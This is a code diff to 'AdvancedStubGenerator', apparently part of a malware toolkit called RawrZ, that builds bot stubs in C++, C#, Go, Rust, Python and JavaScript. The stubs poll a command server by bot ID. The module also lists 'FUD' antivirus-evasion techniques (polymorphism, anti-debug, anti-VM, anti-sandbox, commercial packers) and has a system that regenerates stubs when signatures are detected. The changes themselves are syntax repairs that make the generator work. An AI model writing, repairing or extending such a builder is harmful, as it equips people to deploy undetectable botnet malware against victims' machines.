@@ -6,7 +6,7 @@ const fs = require('fs').promises;
 const path = require('path');
 const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
-const { getMemoryManager } = require('../utils/memory-manager');
+const memoryManager = require('./memory-manager');
 const os = require('os');
 const zlib = require('zlib');
 
@@ -27,8 +27,8 @@ class AdvancedStubGenerator {
         }
     }
     constructor() {
-        this.stubTemplates = this.memoryManager.createManagedCollection('stubTemplates', 'Map', 100);
-        this.tempGenerators = this.memoryManager.createManagedCollection('tempGenerators', 'Map', 100);
+        this.stubTemplates = new Map();
+        this.tempGenerators = new Map();
         this.fudTechniques = [
             'polymorphic', 'metamorphic', 'obfuscation', 'encryption',
             'packing', 'anti-debug', 'anti-vm', 'anti-sandbox',
@@ -39,7 +39,7 @@ class AdvancedStubGenerator {
             'godlike-obfuscation', 'ultimate-stealth', 'anti-everything'
         ];
         this.regenerationCount = 0;
-        this.activeStubs = this.memoryManager.createManagedCollection('activeStubs', 'Map', 100);
+        this.activeStubs = new Map();
         this.packingMethods = ['upx', 'themida', 'vmprotect', 'enigma', 'mpress', 'aspack', 'custom'];
         this.obfuscationLevels = ['none', 'basic', 'intermediate', 'advanced', 'extreme', 'godlike'];
         
@@ -774,23 +774,23 @@ class AdvancedStubGenerator {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return "
+        return `
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
 // Generated: ${new Date().toISOString()}
 
-#include <windows.h>`
-#include <wininet.h>`
-#include <iostream>`
-#include <string>`
-#include <vector>`
-#include <thread>`
-#include <chrono>`
-#include <random>`
-#include <crypto++/aes.h>`
-#include <crypto++/modes.h>`
-#include <crypto++/filters.h>`
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <random>
+#include <crypto++/aes.h>
+#include <crypto++/modes.h>
+#include <crypto++/filters.h>
 
 class RawrZStub {
 private:
@@ -916,14 +916,14 @@ int main() {
     stub.start();
     return 0;
 }
-";
+`;
     }
 
     generateCSharpStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return "
+        return `
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1071,14 +1071,14 @@ namespace RawrZStub {
         }
     }
 }
-";
+`;
     }
 
     generateGoStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return "
+        return `
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1245,7 +1245,7 @@ func main() {
     stub := &RawrZStub{
         serverURL:     "${serverUrl}",
         botID:         "${botId}",
-        encryptionKey: `${crypto.randomBytes(32).toString('hex')}`,
+        encryptionKey: "${crypto.randomBytes(32).toString('hex')}",
         isRunning:     true,
         httpClient:    &http.Client{Timeout: 30 * time.Second},
     }
@@ -1283,7 +1283,7 @@ struct RawrZStub {
 }
 
 impl RawrZStub {
-    fn new() ->` Self {
+    fn new() -> Self {
         Self {
             server_url: "${serverUrl}".to_string(),
             bot_id: "${botId}".to_string(),
@@ -1421,14 +1421,14 @@ fn main() {
     let stub = RawrZStub::new();
     stub.start();
 }
-";
+`;
     }
 
     generatePythonStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return "
+        return `
 # RawrZ Advanced Stub - ${template.name}
 # Features: ${features}
 # Encryption: ${encryptionMethods}
@@ -1563,14 +1563,14 @@ class RawrZStub:
 if __name__ == "__main__":
     stub = RawrZStub()
     stub.start()
-";
+`;
     }
 
     generateJavaScriptStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return "
+        return `
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1721,7 +1721,7 @@ class RawrZStub {
                 const options = {
                     hostname: new URL(this.serverUrl).hostname,
                     port: new URL(this.serverUrl).port || 80,
-                    path: "/http-bot/command/` + this.botId,
+                    path: "/http-bot/command/" + this.botId,
                     method: 'GET',
                     headers: {
                         'User-Agent': 'RawrZBot/1.0'
@@ -1876,8 +1876,8 @@ stub.start();
 
     // FUD Regeneration Features
     async initializeFUDRegeneration() {
-        this.detectionTriggers = this.memoryManager.createManagedCollection('detectionTriggers', 'Map', 100);
-        this.regenerationSchedules = this.memoryManager.createManagedCollection('regenerationSchedules', 'Map', 100);
+        this.detectionTriggers = new Map();
+        this.regenerationSchedules = new Map();
         this.autoRegenerationEnabled = false;
         this.detectionThresholds = {
             signatureDetection: 0.8,
@@ -2138,8 +2138,8 @@ stub.start();
 
     // Unpack/Repack System
     async initializeUnpackRepackSystem() {
-        this.unpackedStubs = this.memoryManager.createManagedCollection('unpackedStubs', 'Map', 100);
-        this.repackHistory = this.memoryManager.createManagedCollection('repackHistory', 'Map', 100);
+        this.unpackedStubs = new Map();
+        this.repackHistory = new Map();
         this.unpackMethods = {
             'upx': this.unpackUPX.bind(this),
             'themida': this.unpackThemida.bind(this),
@@ -2444,7 +2444,7 @@ stub.start();
 
         let entropy = 0;
         for (let i = 0; i < 256; i++) {
-            if (frequencies[i] >` 0) {
+            if (frequencies[i] > 0) {
                 const p = frequencies[i] / bytes.length;
                 entropy -= p * Math.log2(p);
             }
@@ -2706,7 +2706,7 @@ stub.start();
         if (times.length < 5) return 'low';
         
         const recent = times.slice(-5);
-        const avg = recent.reduce((sum, time) =>` sum + time, 0) / recent.length;
+        const avg = recent.reduce((sum, time) => sum + time, 0) / recent.length;
         
         if (avg > 60000) return 'high';
         if (avg > 30000) return 'medium';
@@ -2761,9 +2761,9 @@ stub.start();
         const hours = Math.floor(minutes / 60);
         const days = Math.floor(hours / 24);
         
-        if (days > 0) return "${days}d ${hours % 24}h " + minutes % 60 + "m";
-        if (hours > 0) return "${hours}h " + minutes % 60 + "m";
-        if (minutes > 0) return "${minutes}m " + seconds % 60 + "s";
+        if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`;
+        if (hours > 0) return `${hours}h ${minutes % 60}m`;
+        if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
         return `${seconds}s`;
     }
 
